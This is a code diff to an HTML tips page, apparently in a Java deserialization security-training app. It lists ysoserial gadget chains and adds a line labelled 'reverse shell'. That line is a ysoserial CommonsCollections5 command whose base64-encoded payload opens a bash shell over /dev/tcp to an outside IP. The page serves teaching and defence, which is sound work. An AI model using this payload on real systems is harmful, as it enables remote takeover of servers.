@@ -506,6 +506,7 @@ public Result secureDeserialize(@RequestBody String base64Data) {
           <li><strong>ysoserial工具：</strong>可以使用ysoserial工具生成各种危险的序列化数据进行反序列化攻击</li>
           <li><strong>常用Payload：</strong>CommonsCollections1、CommonsCollections2、URLDNS、JRMPClient等</li>
           <li><strong>生成命令：</strong><code>java -jar ysoserial.jar CommonsCollections1 "whoami" | base64</code></li>
+          <li><strong>反弹shell：</strong><code>java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjguOC44LzEyMzQgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64</code></li>
           <li><strong>安全建议：</strong>在生产环境中应该使用白名单验证，禁止反序列化危险类</li>
         </ul>
       </div>
